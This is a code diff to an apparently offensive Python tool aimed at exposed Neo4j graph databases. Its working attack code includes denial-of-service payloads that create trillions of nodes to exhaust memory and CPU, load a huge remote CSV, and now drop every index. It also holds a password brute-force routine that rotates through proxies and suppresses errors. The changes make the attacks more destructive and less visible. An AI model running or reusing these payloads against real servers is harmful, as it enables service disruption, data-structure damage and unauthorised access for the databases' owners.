@@ -22,10 +22,13 @@ def banner():
      An analysis graph database tool
     """)
 def dos_RamCpu(ip,url_query,headers):
-    requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:"name"+x, age: x%100}));'}]},headers=headers,timeout=60).json()
+	print "Send loop to crash Neo4j..."
+	requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:"name"+x, age: x%100}));'}]},headers=headers,timeout=30).json()
 def dos_disco2(ip,url_query,headers):
-    requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});'}]},headers=headers,timeout=10).json()
+	print "Load huge CSV..."
+	requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});'}]},headers=headers,timeout=10).json()
 def dos_disco1(ip,url_query,url_labels,url_props,headers):
+	print "Create all posible indexes"
 	l = []
 	g={}
 	labels = requests.get(url_labels,auth=('neo4j', ''),timeout=1 ).json()
@@ -33,7 +36,7 @@ def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	for label in labels:
 		for prop in props:
 			g1 ={}
-			g1["statement"] = str("CREATE INDEX ON:"+label+"("+prop+");")
+			g1["statement"] = str("DROP INDEX ON:"+label+"("+prop+");")
 			l.append(g1)
 	g["statements"] = l
 	requests.post(url_query,json=g,headers=headers)
@@ -47,13 +50,12 @@ def brutteForce_Neo4j(ip,dictpassw,dictproxies,headers):
   			'http': 'http://'+dictproxies[i%(len(dictproxies)-1)],
 		}
 		try:
-			r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=2, proxies=proxies )
-			print r_pass
+			r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=2, proxies=proxies)
 			if (r_pass.status_code == 200):
 				print "Password: " + passw
 				return passw
 		except Exception as e:
-			print e
+			pass
 
 def brutteForce_Orient(ip,dictpassw):
 
@@ -116,8 +118,7 @@ def analyzeIP_Neo4j(ip,args):
 			payload = "[\"org.neo4j:instance=kernel#0,name=Primitive count\",\"org.neo4j:instance=kernel#0,name=High Availability\"]"
 			headers = {
 			    'content-type': "application/json",
-			    'accept': "application/json",
-			    'authorization': "Basic "
+			    'accept': "application/json"
 			    }
 			response = requests.request("POST", url_data, data=payload, headers=headers)
 			data_report['NumNodes'] = response.json()[0].get("attributes")[0].get("value")
@@ -142,12 +143,20 @@ def analyzeIP_Neo4j(ip,args):
 			''' DoS to the Neo4j '''
 			if args.DoS == True:
 				try:
+					print "DoS attack"
 					dos_disco1(ip,url_query,url_labels,url_props,headers)
-					dos_disco2(ip,url_query,headers)
-					dos_RamCpu(ip,url_query,headers)
-					
+					try:
+						dos_disco2(ip,url_query,headers)
+					except Exception as e:
+						pass
+					try:
+						dos_RamCpu(ip,url_query,headers)
+					except Exception as e:
+						pass
+					print "DoS end"
 				except Exception as e:
 					print "Error en la denegacion"
+					print e
 					
 			''' Part of a cluster '''
 			url_cluster_avalaible = "http://" + ip + ":7474/db/manage/server/ha/available"
